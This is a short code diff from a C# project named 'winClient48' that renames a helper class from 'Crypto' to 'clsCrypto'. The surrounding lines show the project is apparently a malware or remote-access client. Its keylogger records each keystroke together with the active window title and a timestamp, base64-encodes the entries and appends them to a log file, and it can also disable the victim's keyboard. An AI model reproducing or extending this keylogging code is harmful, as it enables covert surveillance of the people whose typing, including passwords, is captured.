@@ -183,7 +183,7 @@ namespace winClient48
                 msg = ex.Message;
             }
 
-            msg = Crypto.b64E2Str(msg);
+            msg = clsCrypto.b64E2Str(msg);
 
             return (code, msg);
         }
@@ -237,7 +237,7 @@ namespace winClient48
                             str_key = $"[{key.ToString()}]";
                         }
                     }
-                    File.AppendAllText(file_keylogger, Crypto.b64E2Str($"{Crypto.b64E2Str(Global.GetActiveWindowTitle())}|{Crypto.b64E2Str(DateTime.Now.ToString("F"))}|{Crypto.b64E2Str(str_key)}"));
+                    File.AppendAllText(file_keylogger, clsCrypto.b64E2Str($"{clsCrypto.b64E2Str(Global.GetActiveWindowTitle())}|{clsCrypto.b64E2Str(DateTime.Now.ToString("F"))}|{clsCrypto.b64E2Str(str_key)}"));
                     File.AppendAllText(file_keylogger, Environment.NewLine);
 
                     if (disable_keyboard)
